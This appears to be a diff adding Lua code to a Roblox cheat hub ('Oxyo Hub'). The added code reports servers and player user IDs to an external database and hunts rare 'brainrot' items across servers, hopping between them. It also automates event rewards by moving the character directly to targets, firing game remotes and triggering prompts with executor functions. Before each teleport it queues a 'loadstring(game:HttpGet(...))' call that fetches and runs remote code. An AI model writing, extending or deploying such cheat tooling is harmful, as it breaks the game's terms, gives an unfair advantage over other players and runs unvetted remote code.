+local function _reporterCycle()
+    if _isPrivateServer() then return end
+    local list = _getBrainrotList()
+    local hash = _listHash(list)
+    if #list > 0 then
+        if hash ~= _lastReportedHash then
+            local res = _fbSafe("PUT", "sv/" .. _FB_JOBKEY, {
+                j=_FB_JOBID, p=game.PlaceId, t=os.time(), c=#list, b=list,
+            })
+            if res ~= nil then
+                _reporterLastWrite = tick()
+                _lastReportedHash  = hash
+                _lastReportedCount = #list
+            end
+        else
+            _reporterLastWrite = tick()
+        end
+    else
+        if _lastReportedCount ~= 0 then
+            _fbSafe("PATCH", "sv/" .. _FB_JOBKEY, { t=os.time(), c=0 })
+            _lastReportedCount = 0
+            _lastReportedHash  = ""
+        end
+        _reporterLastWrite = tick()
+    end
+    return #list
+end
+local function _startReporter()
+    if _reporterActive then return end
+    _reporterActive    = true
+    _reporterLastWrite = tick()
+    _reporterThread = task.spawn(function()
+        while _reporterActive do
+            local count = 0
+            pcall(function() count = _reporterCycle() or 0 end)
+            task.wait(_getReporterInterval(count))
+        end
+        pcall(function() _fbSafe("DELETE", "sv/" .. _FB_JOBKEY, nil) end)
+    end)
+end
+local function _stopReporter()
+    _reporterActive = false
+    if _reporterThread then pcall(task.cancel, _reporterThread) _reporterThread = nil end
+    pcall(function() _fbSafe("DELETE", "sv/" .. _FB_JOBKEY, nil) end)
+end
+task.spawn(function()
+    task.wait(60)
+    while true do
+        task.wait(30)
+        if _reporterActive then
+            local stale = (tick() - _reporterLastWrite) > 150
+            local dead  = (_reporterThread == nil)
+            if stale or dead then
+                if _reporterThread then pcall(task.cancel, _reporterThread) _reporterThread = nil end
+                _reporterActive    = false
+                _reporterLastWrite = tick()
+                _startReporter()
+            end
+        end
+    end
+end)
+task.spawn(function()
+    while true do
+        task.wait(300)
+        pcall(function()
+            while #_webhookHistory > 30 do table.remove(_webhookHistory) end
+            local now = tick()
+            for _, qkey in next, {"oxyo"} do
+                for i = #_queues[qkey], 1, -1 do
+                    if now - (_queues[qkey][i].queuedAt or 0) > 600 then table.remove(_queues[qkey], i) end
+                end
+            end
+        end)
+    end
+end)
+local _UC_KEY       = tostring(game.JobId):gsub("-","_") .. "_" .. tostring(Players.LocalPlayer.UserId)
+local _ucThread     = nil
+local _ucActive     = false
+local _ucLastWrite  = 0
+local function _startUserCount()
+    if _ucActive then return end
+    _ucActive = true
+    pcall(function()
+        local res = _fbSafe("PUT", "uc/" .. _UC_KEY, { t=os.time() })
+        if res ~= nil then _ucLastWrite = tick() end
+    end)
+    _ucThread = task.spawn(function()
+        while _ucActive do
+            task.wait(20)
+            pcall(function()
+                local res = _fbSafe("PUT", "uc/" .. _UC_KEY, { t=os.time() })
+                if res == nil then
+                    task.wait(3)
+                    local res2 = _fbSafe("PUT", "uc/" .. _UC_KEY, { t=os.time() })
+                    if res2 ~= nil then _ucLastWrite = tick() end
+                else
+                    _ucLastWrite = tick()
+                end
+            end)
+        end
+    end)
+end
+local function _stopUserCount()
+    _ucActive = false
+    if _ucThread then pcall(task.cancel, _ucThread) _ucThread = nil end
+    pcall(function() _fbSafe("DELETE", "uc/" .. _UC_KEY, nil) end)
+end
+local function _getActiveUserCount()
+    local data = _fbSafe("GET", "uc", nil, 5)
+    if type(data) ~= "table" then return 0 end
+    local now, count = os.time(), 0
+    for _, v in pairs(data) do
+        if type(v) == "table" and (now - (v.t or 0)) <= 60 then count = count + 1 end
+    end
+    return count
+end
+local _pubCacheIds  = nil
+local _pubCacheTime = 0
+local _pubCacheTTL  = 25
+local function _fetchPublicJobIds(forceFresh)
+    if not forceFresh and _pubCacheIds and (tick() - _pubCacheTime) < _pubCacheTTL then
+        return _pubCacheIds
+    end
+    local ids    = {}
+    local cursor = ""
+    local hs     = game:GetService("HttpService")
+    for _ = 1, 6 do
+        local url = "https://games.roblox.com/v1/games/" .. game.PlaceId
+                 .. "/servers/Public?sortOrder=Asc&limit=100"
+        if cursor ~= "" then url = url .. "&cursor=" .. cursor end
+        local ok, body = pcall(function() return game:HttpGet(url) end)
+        if not ok or not body or body == "" then break end
+        local ok2, data = pcall(function() return hs:JSONDecode(body) end)
+        if not ok2 or not data or not data.data then break end
+        for _, s in ipairs(data.data) do
+            if s.id then ids[s.id] = tonumber(s.playing) or 0 end
+        end
+        if data.nextPageCursor and data.nextPageCursor ~= "" then
+            cursor = data.nextPageCursor
+            task.wait(0.08)
+        else
+            break
+        end
+    end
+    _pubCacheIds  = ids
+    _pubCacheTime = tick()
+    return ids
+end
+local function _fbDeleteAndSkip(key)
+    task.spawn(function()
+        pcall(function() _fbSafe("DELETE", "sv/" .. key, nil) end)
+    end)
+    return true
+end
+_searchServers = function(targetName, targetRarity, targetDisplayName, targetMutation, targetTrait)
+    local servers = _fbSafe("GET", "sv", nil, 7)
+    if type(servers) ~= "table" then return nil, nil end
+    local pubIds = _fetchPublicJobIds()
+    local now    = os.time()
+    local tRar   = targetRarity   and targetRarity:lower()   or nil
+    local tMut   = targetMutation and targetMutation:lower() or nil
+    local tTrait = targetTrait    and targetTrait:lower()    or nil
+    local function norm(s)
+        return (s or ""):lower():gsub("%s+", ""):gsub("[^%a%d]", "")
+    end
+    local tRaw   = (targetName or ""):lower()
+    local tNorm  = norm(targetName)
+    local tDisp  = (targetDisplayName or ""):lower()
+    local tDispN = norm(targetDisplayName)
+    local function nameMatches(bName)
+        if not bName or bName == "" then return false end
+        local bLow  = bName:lower()
+        local bNorm = norm(bName)
+        if bLow == tRaw or bLow == tDisp then return true end
+        if bNorm == tNorm or bNorm == tDispN then return true end
+        if tNorm ~= "" and (bNorm:find(tNorm, 1, true) or tNorm:find(bNorm, 1, true)) then return true end
+        if tDispN ~= "" and (bNorm:find(tDispN, 1, true) or tDispN:find(bNorm, 1, true)) then return true end
+        return false
+    end
+    local function mutMatches(bMut)
+        if not tMut then return true end
+        if not bMut then return false end
+        return bMut:lower() == tMut
+    end
+    local function traitMatches(bTraits)
+        if not tTrait then return true end
+        if type(bTraits) ~= "table" then return false end
+        for _, tr in ipairs(bTraits) do
+            if tostring(tr):lower() == tTrait then return true end
+        end
+        return false
+    end
+    local candidates = {}
+    for key, data in pairs(servers) do
+        if key == _FB_JOBKEY then continue end
+        if type(data) ~= "table" then continue end
+        if (now - (data.t or 0)) > 45 then
+            _fbDeleteAndSkip(key)
+            continue
+        end
+        local jobId = data.j
+        if not jobId or not pubIds[jobId] then
+            _fbDeleteAndSkip(key)
+            continue
+        end
+        if pubIds[jobId] <= 0 then
+            _fbDeleteAndSkip(key)
+            continue
+        end
+        if type(data.b) ~= "table" then continue end
+        for _, b in ipairs(data.b) do
+            if not nameMatches(b.n) then continue end
+            local bRar = b.r and b.r:lower() or ""
+            if tRar and bRar ~= tRar then continue end
+            if not mutMatches(b.m) then continue end
+            if not traitMatches(b.t) then continue end
+            local score = 0
+            if b.m and b.m ~= "" then score = score + 10 end
+            if type(b.t) == "table" and #b.t > 0 then score = score + 10 end
+            score = score + math.max(0, 45 - (now - (data.t or 0)))
+            table.insert(candidates, { job = jobId, entry = b, score = score })
+        end
+    end
+    if #candidates == 0 then return nil, nil end
+    table.sort(candidates, function(a, b) return a.score > b.score end)
+    return candidates[1].job, candidates[1].entry
+end
+task.delay(2, function()
+    if not _isPrivateServer() then _startUserCount() end
+end)
+task.delay(5, function()
+    if _isPrivateServer() then
+        pcall(function()
+            Rayfield:Notify({
+                Title    = "⛔ Private Server",
+                Content  = "Reporter & webhooks are disabled.\nJoin a public server to use the Finder.",
+                Duration = 8,
+                Image    = 4483362458,
+            })
+        end)
+        return
+    end
+    task.spawn(function()
+        local deadline = tick() + 25
+        while tick() < deadline do
+            if #_getBrainrotList() > 0 then break end
+            task.wait(2)
+        end
+        _startReporter()
+    end)
+end)
+game:GetService("Players").LocalPlayer.AncestryChanged:Connect(function()
+    pcall(_stopReporter)
+    pcall(_stopUserCount)
+end)
+BrainrotFinderTab:CreateSection("Status")
+local _userCountPara = BrainrotFinderTab:CreateParagraph({
+    Title   = "👥 Active Users",
+    Content = "Loading...",
+})
+task.spawn(function()
+    while true do
+        pcall(function()
+            local n = _getActiveUserCount()
+            _userCountPara:Set({
+                Title   = "👥 " .. n .. " users online",
+                Content = "Players currently running Oxyo Hub in this game.",
+            })
+        end)
+        task.wait(15)
+    end
+end)
+BrainrotFinderTab:CreateButton({
+    Name     = "📊 Active Reporters",
+    Callback = function()
+        task.spawn(function()
+            local servers = _fbReq("GET", "sv", nil)
+            if type(servers) ~= "table" then
+                Rayfield:Notify({ Title = "Finder", Content = "No active reporters found.", Duration = 3, Image = 4483362458 })
+                return
+            end
+            local now   = os.time()
+            local count = 0
+            local total = 0
+            for _, data in pairs(servers) do
+                if type(data) == "table" and (now - (data.t or 0)) <= 45 then
+                    count = count + 1
+                    total = total + (data.c or 0)
+                end
+            end
+            Rayfield:Notify({
+                Title   = "📊 " .. count .. " Servers Online",
+                Content = total .. " brainrots being tracked right now",
+                Duration = 5,
+                Image   = 4483362458,
+            })
+        end)
+    end,
+})
+BrainrotFinderTab:CreateSection("Hunter")
+local _hunterName     = ""
+local _hunterRarity   = nil
+local _hunterMutation = nil
+local _hunterTrait    = nil
+BrainrotFinderTab:CreateInput({
+    Name                     = "Brainrot Name",
+    PlaceholderText          = "e.g. Chimpanzini, Titan...",
+    RemoveTextAfterFocusLost = false,
+    Callback                 = function(v) _hunterName = v:gsub("^%s+", ""):gsub("%s+$", "") end,
+})
+BrainrotFinderTab:CreateDropdown({
+    Name            = "Rarity Filter",
+    Options         = { "Any", "Common", "Rare", "Epic", "Legendary", "Mythic", "Secret", "Celestial", "Godly" },
+    CurrentOption   = { "Any" },
+    MultipleOptions = false,
+    Callback        = function(v)
+        _hunterRarity = (v == "Any") and nil or v
+    end,
+})
+BrainrotFinderTab:CreateDropdown({
+    Name            = "Mutation Filter",
+    Options         = { "Any", "Gold", "Emerald", "Diamond", "Bloodmoon", "Rainbow", "Cheese", "Aqua" },
+    CurrentOption   = { "Any" },
+    MultipleOptions = false,
+    Flag            = "FinderMutation",
+    Callback        = function(v)
+        local opt = type(v) == "table" and v[1] or v
+        _hunterMutation = (opt == "Any") and nil or opt
+    end,
+})
+BrainrotFinderTab:CreateDropdown({
+    Name            = "Trait Filter",
+    Options         = { "Any", "MoonGlow", "Magma", "Storm", "Slime", "Volcano", "Shamrock", "Ice" },
+    CurrentOption   = { "Any" },
+    MultipleOptions = false,
+    Flag            = "FinderTrait",
+    Callback        = function(v)
+        local opt = type(v) == "table" and v[1] or v
+        _hunterTrait = (opt == "Any") and nil or opt
+    end,
+})
+BrainrotFinderTab:CreateButton({
+    Name     = "🔍 Search & Hop",
+    Callback = function()
+        if _hunterName == "" then
+            Rayfield:Notify({ Title = "Finder", Content = "Enter a brainrot name first!", Duration = 3, Image = 4483362458 })
+            return
+        end
+        local searchLabel = _hunterName
+        if _hunterRarity   then searchLabel = searchLabel .. " | " .. _hunterRarity end
+        if _hunterMutation then searchLabel = searchLabel .. " | " .. _hunterMutation end
+        if _hunterTrait    then searchLabel = searchLabel .. " | Trait:" .. _hunterTrait end
+        Rayfield:Notify({ Title = "🔍 Searching...", Content = searchLabel, Duration = 3, Image = 4483362458 })
+        task.spawn(function()
+            local realJobId, found = _searchServers(
+                _hunterName, _hunterRarity, nil, _hunterMutation, _hunterTrait)
+            if not realJobId then
+                local relaxMsg = ""
+                if _hunterMutation or _hunterTrait then
+                    relaxMsg = "\nTip: Try setting filters to 'Any' to find normal variants."
+                end
+                Rayfield:Notify({
+                    Title   = "Not Found ❌",
+                    Content = "No server has " .. searchLabel .. " right now.\nMake sure others have Reporter ON!" .. relaxMsg,
+                    Duration = 7,
+                    Image   = 4483362458,
+                })
+                return
+            end
+            local mutStr   = (found.m) and (" [" .. found.m .. "]") or " [Normal]"
+            local traitStr = ""
+            if type(found.t) == "table" and #found.t > 0 then
+                traitStr = " {" .. table.concat(found.t, "+") .. "}"
+            end
+            Rayfield:Notify({
+                Title   = "Found! 🎯",
+                Content = found.n .. mutStr .. traitStr
+                       .. "\n" .. (found.r or "?")
+                       .. "\nHopping in 2s...",
+                Duration = 5,
+                Image   = 4483362458,
+            })
+            task.wait(2)
+            if isAnyHopStopped() then return end
+            getgenv().OxyoHubLoaded = false
+            if not getgenv().OxyoExecQueued then
+                getgenv().OxyoExecQueued = true
+                local _qs = 'loadstring(game:HttpGet("' .. AUTO_EXEC_URL .. '"))()'
+                pcall(function() if typeof(queue_on_teleport)=="function" then queue_on_teleport(_qs) end end)
+                pcall(function() if typeof(syn)=="table" and typeof(syn.queue_on_teleport)=="function" then syn.queue_on_teleport(_qs) end end)
+                pcall(function() if typeof(fluxus)=="table" and typeof(fluxus.queue_on_teleport)=="function" then fluxus.queue_on_teleport(_qs) end end)
+            end
+            pcall(function()
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, realJobId, Players.LocalPlayer)
+            end)
+        end)
+    end,
+})
+BrainrotFinderTab:CreateSection("Quick Hunt")
+for _, rarity in ipairs({ "Godly", "Celestial", "Secret", "Mythic" }) do
+    BrainrotFinderTab:CreateButton({
+        Name     = "⚡ Any " .. rarity,
+        Callback = function()
+            Rayfield:Notify({ Title = "🔍 Hunting " .. rarity .. "...", Content = "Scanning & verifying servers...", Duration = 3, Image = 4483362458 })
+            task.spawn(function()
+                local servers = _fbSafe("GET", "sv", nil, 7)
+                if type(servers) ~= "table" then
+                    Rayfield:Notify({ Title = "Not Found", Content = "No reporters active.", Duration = 4, Image = 4483362458 })
+                    return
+                end
+                local pubIds = _fetchPublicJobIds(true)
+                local now    = os.time()
+                local rarLow = rarity:lower()
+                local candidates = {}
+                for key, data in pairs(servers) do
+                    if type(data) ~= "table" then continue end
+                    if (now - (data.t or 0)) > 45 then
+                        _fbDeleteAndSkip(key)
+                        continue
+                    end
+                    local jobId = data.j
+                    if not jobId or not pubIds[jobId] then
+                        _fbDeleteAndSkip(key)
+                        continue
+                    end
+                    if pubIds[jobId] <= 0 then
+                        _fbDeleteAndSkip(key)
+                        continue
+                    end
+                    if type(data.b) ~= "table" then continue end
+                    for _, b in ipairs(data.b) do
+                        if b.r and b.r:lower() == rarLow then
+                            local score = 0
+                            if b.m and b.m ~= "" then score = score + 20 end
+                            if type(b.t) == "table" and #b.t > 0 then score = score + 15 end
+                            score = score + math.max(0, 45 - (now - (data.t or 0)))
+                            table.insert(candidates, { job = jobId, b = b, score = score })
+                        end
+                    end
+                end
+                if #candidates == 0 then
+                    Rayfield:Notify({ Title = "Not Found ❌", Content = "No verified public server has " .. rarity .. " right now.", Duration = 5, Image = 4483362458 })
+                    return
+                end
+                table.sort(candidates, function(a, b2) return a.score > b2.score end)
+                local pick   = candidates[1]
+                local b      = pick.b
+                local mutStr   = b.m and (" [" .. b.m .. "]") or ""
+                local traitStr = ""
+                if type(b.t) == "table" and #b.t > 0 then
+                    traitStr = " {" .. table.concat(b.t, "+") .. "}"
+                end
+                Rayfield:Notify({
+                    Title   = "Found " .. rarity .. "! 🎯",
+                    Content = b.n .. mutStr .. traitStr .. "\nHopping in 2s...",
+                    Duration = 5,
+                    Image   = 4483362458,
+                })
+                task.wait(2)
+                if isAnyHopStopped() then return end
+                getgenv().OxyoHubLoaded = false
+                if not getgenv().OxyoExecQueued then
+                    getgenv().OxyoExecQueued = true
+                    local _qs = 'loadstring(game:HttpGet("' .. AUTO_EXEC_URL .. '"))()'
+                    pcall(function() if typeof(queue_on_teleport)=="function" then queue_on_teleport(_qs) end end)
+                    pcall(function() if typeof(syn)=="table" and typeof(syn.queue_on_teleport)=="function" then syn.queue_on_teleport(_qs) end end)
+                    pcall(function() if typeof(fluxus)=="table" and typeof(fluxus.queue_on_teleport)=="function" then fluxus.queue_on_teleport(_qs) end end)
+                end
+                pcall(function()
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, pick.job, Players.LocalPlayer)
+                end)
+            end)
+        end,
+    })
+end
+end)()
+
+;(function()
+
+local _dreamRunning  = false
+local _dreamThread   = nil
+local _dreamSubmitRemote = nil
+
+local DREAM_MACHINE_POS = Vector3.new(0, 5, 0)
+
+local function _isDreamEventActive()
+    local gf = workspace:FindFirstChild("GameFolder")
+    if gf and gf:FindFirstChild("DreamEvent") then return true end
+    if workspace:FindFirstChild("DreamEvent") then return true end
+
+    pcall(function()
+        local cfg = require(game:GetService("ReplicatedStorage").Registries.ConfigRegistry)
+        if cfg and cfg.DreamEvent == true then return end
+    end)
+    return false
+end
+
+local function _getDreamBrainrots()
+    local found = {}
+    local gf = workspace:FindFirstChild("GameFolder")
+    local brFolder = gf and gf:FindFirstChild("Brainrots")
+    if not brFolder then return found end
+    for _, rarityFolder in ipairs(brFolder:GetChildren()) do
+        for _, obj in ipairs(rarityFolder:GetChildren()) do
+            if obj and obj.Parent then
+                local td = S.traitData[obj]
+                if td then
+                    for _, t in ipairs(td.traitNames) do
+                        if t == "Dream" then
+                            table.insert(found, { obj = obj, rarity = rarityFolder.Name })
+                            break
+                        end
+                    end
+                else
+
+                    local ok, traitAttr = pcall(function() return obj:GetAttribute("Traits") end)
+                    if ok and type(traitAttr) == "table" then
+                        for _, t in ipairs(traitAttr) do
+                            if t == "Dream" then
+                                table.insert(found, { obj = obj, rarity = rarityFolder.Name })
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return found
+end
+
+local function _findDreamMachine()
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("Model") or obj:IsA("BasePart") then
+            if obj.Name == "DreamMachine" or obj.Name == "Dream Machine" then
+                return obj
+            end
+        end
+    end
+    return nil
+end
+
+local function _getDreamRemote()
+    if _dreamSubmitRemote and _dreamSubmitRemote.Parent then return _dreamSubmitRemote end
+    local ok, remote = pcall(function()
+        return ReplicatedStorage
+            :WaitForChild("Remotes", 5)
+            :WaitForChild("DreamEvent", 5)
+            :WaitForChild("SubmitBrainrot", 5)
+    end)
+    if ok and remote then
+        _dreamSubmitRemote = remote
+        return remote
+    end
+    return nil
+end
+
+local function _submitDreamBrainrot(brainrotObj)
+    local machine = _findDreamMachine()
+    if not machine then return false end
+
+    local machPos
+    if machine:IsA("Model") and machine.PrimaryPart then
+        machPos = machine.PrimaryPart.Position
+    elseif machine:IsA("BasePart") then
+        machPos = machine.Position
+    else
+        local bp = machine:FindFirstChildWhichIsA("BasePart")
+        if bp then machPos = bp.Position end
+    end
+    if not machPos then return false end
+
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+
+    local hum = player.Character:FindFirstChildOfClass("Humanoid")
+    if hum and brainrotObj:IsA("Tool") then
+        pcall(function() hum:EquipTool(brainrotObj) end)
+        task.wait(0.2)
+    end
+
+    root.CFrame = CFrame.new(machPos + Vector3.new(0, 3, 3))
+    task.wait(2)
+
+    local pp = machine:FindFirstChildWhichIsA("ProximityPrompt", true)
+    if pp then
+        _fireprox(pp)
+        task.wait(0.5)
+        return true
+    end
+
+    local remote = _getDreamRemote()
+    if remote then
+        pcall(function() remote:FireServer(brainrotObj) end)
+        task.wait(0.4)
+        return true
+    end
+
+    return false
+end
+
+local function _startDreamLoop()
+    Rayfield:Notify({
+        Title   = "💜 Dream Auto",
+        Content = "Started! Collecting Dream brainrots and submitting...",
+        Duration = 3, Image = 4483362458,
+    })
+
+    while _dreamRunning do
+        hideLava()
+
+        local dreamBrainrots = _getDreamBrainrots()
+
+        if #dreamBrainrots == 0 then
+            task.wait(3)
+        else
+
+            local char = Players.LocalPlayer.Character
+            if char and char.PrimaryPart then
+                local myPos = char.PrimaryPart.Position
+                table.sort(dreamBrainrots, function(a, b)
+                    local ppA = a.obj.PrimaryPart and a.obj.PrimaryPart.Position or myPos
+                    local ppB = b.obj.PrimaryPart and b.obj.PrimaryPart.Position or myPos
+                    return (ppA - myPos).Magnitude < (ppB - myPos).Magnitude
+                end)
+            end
+
+            local submitted = 0
+            for _, entry in ipairs(dreamBrainrots) do
+                if not _dreamRunning then break end
+                if entry.obj and entry.obj.Parent then
+                    local ok, did = pcall(grabBrainrot, entry.obj)
+                    if ok and did then
+                        task.wait(0.3)
+                        local subOk = pcall(_submitDreamBrainrot, entry.obj)
+                        if subOk then
+                            submitted = submitted + 1
+                            task.wait(0.3)
+                        end
+
+                        pcall(function()
+                            local root2 = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                            if root2 then root2.CFrame = getSafeBase() end
+                        end)
+                    end
+                end
+            end
+
+            if submitted > 0 then
+                Rayfield:Notify({
+                    Title   = "💜 Dream Auto",
+                    Content = "Submitted " .. submitted .. " Dream brainrot(s) to the Machine!",
+                    Duration = 3, Image = 4483362458,
+                })
+            end
+
+            task.wait(2)
+        end
+    end
+end
+
+DreamsTab:CreateSection("💜 Dream Event")
+
+DreamsTab:CreateToggle({
+    Name         = "💜 Auto Submit Dream Brainrots",
+    CurrentValue = false,
+    Flag         = "DreamAutoSubmit",
+    Callback     = function(val)
+        _dreamRunning = val
+        if val then
+            hideLava()
+            _dreamThread = task.spawn(_startDreamLoop)
+        else
+            if _dreamThread then pcall(task.cancel, _dreamThread) _dreamThread = nil end
+            Rayfield:Notify({ Title = "💜 Dream Auto", Content = "Stopped.", Duration = 2, Image = 4483362458 })
+        end
+    end,
+})
+
+DreamsTab:CreateSection("🎁 Dream Lucky Blocks")
+
+DreamsTab:CreateButton({
+    Name     = "🌙 Auto Open Dream Lucky Blocks",
+    Callback = function()
+        task.spawn(function()
+            local gf = workspace:FindFirstChild("GameFolder")
+            local lb = gf and gf:FindFirstChild("LuckyBlocks")
+            if not lb then
+                Rayfield:Notify({ Title = "🌙 Dream LB", Content = "LuckyBlocks folder not found!", Duration = 3, Image = 4483362458 })
+                return
+            end
+            local count = 0
+            for _, block in ipairs(lb:GetChildren()) do
+                local bn = block.Name:lower()
+                if bn:find("dream") then
+                    local pp = block:FindFirstChildWhichIsA("ProximityPrompt", true)
+                    if pp then
+                        local bpos = pp.Parent.Position
+                        if isValidPos(bpos) then
+                            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                            if root then
+                                hideLava()
+                                root.CFrame = CFrame.new(bpos + Vector3.new(0, 3, 3))
+                                task.wait(0.3)
+                                _fireprox(pp)
+                                task.wait(0.5)
+                                root.CFrame = getSafeBase()
+                                count = count + 1
+                            end
+                        end
+                    end
+                end
+            end
+            if count == 0 then
+                Rayfield:Notify({ Title = "🌙 Dream LB", Content = "No Dream Lucky Blocks found in world!", Duration = 3, Image = 4483362458 })
+            else
+                Rayfield:Notify({ Title = "🌙 Dream LB", Content = "Opened " .. count .. " Dream Lucky Block(s)!", Duration = 3, Image = 4483362458 })
+            end
+        end)
+    end,
+})
+
+DreamsTab:CreateSection("🧸 Dream Brainrots")
+
+local DREAM_BRAINROTS = {
+    { name = "CrescentMoonolini",  displayName = "Crescent Moonolini",  rarity = "Secret"    },
+    { name = "CloudiniGenie",      displayName = "Cloudini Genie",      rarity = "Secret"    },
+    { name = "SnoozySlumberini",   displayName = "Snoozy Slumberini",   rarity = "Celestial" },
+    { name = "BuffTeddorini",      displayName = "Buff Teddorini",      rarity = "Celestial" },
+    { name = "ShootingStellino",   displayName = "Shooting Stellino",   rarity = "Celestial" },
+    { name = "LosTicTacsCitos",    displayName = "Los Tic Tacs Citos",  rarity = "Celestial" },
+    { name = "LaCathedraleMammoth",displayName = "La Cathedrale Mammoth",rarity = "Godly"    },
+}
+
+DreamsTab:CreateButton({
+    Name     = "🔍 Scan for Dream Brainrots",
+    Callback = function()
+        task.spawn(function()
+            local found = {}
+            for _, rarity in ipairs(ALL_RARITIES) do
+                local folder = getBrainrotFolder(rarity)
+                if folder then
+                    for _, obj in ipairs(folder:GetChildren()) do
+                        if obj and obj.Parent then
+
+                            local hasDream = false
+                            local td = S.traitData[obj]
+                            if td then
+                                for _, t in ipairs(td.traitNames) do
+                                    if t == "Dream" then hasDream = true break end
+                                end
+                            end
+
+                            local dn = obj:GetAttribute("DisplayName") or obj.Name
+                            for _, db in ipairs(DREAM_BRAINROTS) do
+                                if obj.Name == db.name or dn == db.displayName then
+                                    hasDream = true break
+                                end
+                            end
+                            if hasDream then
+                                local mut = obj:GetAttribute("Mutation") or "Normal"
+                                table.insert(found, rarity .. " - " .. dn .. " [" .. mut .. "]")
+                            end
+                        end
+                    end
+                end
+            end
+            if #found == 0 then
+                Rayfield:Notify({ Title = "🔍 Dream Scan", Content = "No Dream brainrots found in world.", Duration = 3, Image = 4483362458 })
+            else
+                Rayfield:Notify({
+                    Title   = "🔍 Dream Scan — " .. #found .. " found",
+                    Content = table.concat(found, "\n"):sub(1, 200),
+                    Duration = 6,
+                    Image   = 4483362458,
+                })
+            end
+        end)
+    end,
+})
+
+DreamsTab:CreateButton({
+    Name     = "🧸 Collect Nearest Dream Brainrot",
+    Callback = function()
+        task.spawn(function()
+            local dreamList = _getDreamBrainrots()
+            if #dreamList == 0 then
+
+                for _, rarity in ipairs(ALL_RARITIES) do
+                    local folder = getBrainrotFolder(rarity)
+                    if folder then
+                        for _, obj in ipairs(folder:GetChildren()) do
+                            if obj and obj.Parent then
+                                for _, db in ipairs(DREAM_BRAINROTS) do
+                                    if obj.Name == db.name then
+                                        table.insert(dreamList, { obj = obj, rarity = rarity })
+                                        break
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            if #dreamList == 0 then
+                Rayfield:Notify({ Title = "🧸 Dream", Content = "No Dream brainrots found.", Duration = 3, Image = 4483362458 })
+                return
+            end
+            local char = Players.LocalPlayer.Character
+            if char and char.PrimaryPart then
+                local myPos = char.PrimaryPart.Position
+                table.sort(dreamList, function(a, b)
+                    local ppA = (a.obj.PrimaryPart and a.obj.PrimaryPart.Position) or myPos
+                    local ppB = (b.obj.PrimaryPart and b.obj.PrimaryPart.Position) or myPos
+                    return (ppA - myPos).Magnitude < (ppB - myPos).Magnitude
+                end)
+            end
+            hideLava()
+            local ok, did = pcall(grabBrainrot, dreamList[1].obj)
+            if ok and did then
+                Rayfield:Notify({ Title = "🧸 Dream", Content = "Collected Dream brainrot!", Duration = 2, Image = 4483362458 })
+            else
+                Rayfield:Notify({ Title = "🧸 Dream", Content = "Failed to collect.", Duration = 2, Image = 4483362458 })
+            end
+        end)
+    end,
+})
+
+DreamsTab:CreateSection("📊 Reward Track")
+
+DreamsTab:CreateButton({
+    Name     = "📊 Check Reward Track Progress",
+    Callback = function()
+        task.spawn(function()
+            local ok, result = pcall(function()
+                local remote = ReplicatedStorage
+                    :WaitForChild("Remotes", 5)
+                    :WaitForChild("DreamEvent", 5)
+                    :WaitForChild("GetRewardTrackState", 5)
+                if remote:IsA("RemoteFunction") then
+                    return remote:InvokeServer()
+                end
+                return nil
+            end)
+            local milestones = {2, 4, 6, 8, 10, 12, 14, 16, 19, 22}
+            local rewards = {
+                "Slapper x5", "$25,000", "Dream Lucky Block", "75 Coins",
+                "Cloudini Genie", "Dream Lucky Block", "Magic Carpet x1",
+                "Dream Lucky Block", "Level Potion x1", "Los Tic Tacs Citos"
+            }
+            if ok and type(result) == "table" and result.submitted ~= nil then
+                local sub = tonumber(result.submitted) or 0
+                local nextIdx = 1
+                for i, m in ipairs(milestones) do
+                    if sub >= m then nextIdx = i + 1 end
+                end
+                local nextReward = rewards[nextIdx] or "All rewards claimed!"
+                local nextMile   = milestones[nextIdx] or "MAX"
+                Rayfield:Notify({
+                    Title   = "📊 Dream Track",
+                    Content = "Submitted: " .. sub .. "\nNext reward (" .. tostring(nextMile) .. "): " .. nextReward,
+                    Duration = 6, Image = 4483362458,
+                })
+            else
+
+                local rewardList = ""
+                for i, m in ipairs(milestones) do
+                    rewardList = rewardList .. "✦ " .. m .. " → " .. rewards[i] .. "\n"
+                end
+                Rayfield:Notify({
+                    Title   = "📊 Dream Machine Rewards",
+                    Content = rewardList:sub(1, 250),
+                    Duration = 8, Image = 4483362458,
+                })
+            end
+        end)
+    end,
+})
+
+end)()
+
+;(function()
+
+_aquaRunning            = false
+local _aquaCastConn     = nil
+local _aquaMinigameConn = nil
+local _aquaStats        = { casts = 0, catches = 0, fails = 0, startTick = 0 }
+
+local _aquaStatsPara    = nil
+
+local _aquaRemotes = {}
+_getAquaRemotes = function()
+    if _aquaRemotes.cast and _aquaRemotes.cast.Parent then return true end
+    local ok, r = pcall(function()
+        return game:GetService("ReplicatedStorage").Remotes:WaitForChild("AquaEvent", 5)
+    end)
+    if not ok or not r then return false end
+    _aquaRemotes.cast        = r:FindFirstChild("CastFishingRod")
+    _aquaRemotes.reel        = r:FindFirstChild("ReelIn")
+    _aquaRemotes.startMini   = r:FindFirstChild("StartMinigame")
+    _aquaRemotes.miniResult  = r:FindFirstChild("MinigameResult")
+    return _aquaRemotes.cast ~= nil
+end
+
+_isAquaActive = function()
+    if workspace:GetAttribute("AquaEventActive") == true then return true end
+    if workspace:GetAttribute("AquaEvent") == true then return true end
+
+    local ok, found = pcall(function()
+        local json = workspace:GetAttribute("ActiveEvents")
+        if not json or json == "" then return false end
+        local d = game:GetService("HttpService"):JSONDecode(json)
+        for key, _ in pairs(d) do
+            if tostring(key):lower():find("aqua", 1, true) then return true end
+        end
+        return false
+    end)
+    return ok and found or false
+end
+
+_getAquaQueuedTime = function()
+
+    local ok2, result2 = pcall(function()
+        if not _etcCached then
+            _etcCached = require(game:GetService("ReplicatedStorage").Modules.EventTimerController)
+        end
+        local etc = _etcCached
+        if not etc or not etc.OnGoingTimers then return nil end
+        for _, timer in pairs(etc.OnGoingTimers) do
+            local rn   = tostring(timer.RealName or ""):lower()
+            local trem = tonumber(timer.TimeRemaining) or 0
+            local ui   = timer.UI
+            local name = ""
+            if typeof(ui) == "Instance" then
+                local nl = ui:FindFirstChild("NameLabel")
+                if nl and nl:IsA("TextLabel") then name = nl.Text:lower() end
+            end
